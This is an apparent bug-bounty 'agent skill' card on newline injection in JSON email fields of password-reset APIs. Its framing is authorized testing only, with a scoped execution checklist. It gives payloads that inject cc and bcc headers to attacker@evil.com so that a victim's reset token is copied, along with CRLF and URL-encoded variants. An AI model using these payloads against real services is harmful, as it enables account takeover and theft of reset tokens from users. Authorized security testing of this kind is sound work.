# SKILL: Newline injection in JSON parameters (password-reset / email)

**Skill id:** `tip/newline-injection-in-json-parameters-password-reset-email`  
**Category:** Auth Bypass, Password Reset, API Hacking  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/41ddac31e880818b815eee63aa12657b  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Auth Bypass, Password Reset, API Hacking**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

APIs that accept email or similar fields in JSON may split on newlines when passing values to mailers or downstream parsers. Injecting \\n can create extra headers or dual recipients, leading to password-reset token theft or account takeover. Test carefully on accounts you own.

## Payload / Code

```
\{"email":"[victim@target.com](mailto:victim@target.com)\\ncc:[attacker@evil.com](mailto:attacker@evil.com)"\}
\{"email":"[victim@target.com](mailto:victim@target.com)\\nbcc:[attacker@evil.com](mailto:attacker@evil.com)"\}
Also try \\r\\n and URL-encoded variants in form fields that become JSON server-side
```

## Source

Twitter/X @zohebxsec — Newline Injection in JSON Parameters (Nov 2026, high engagement)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
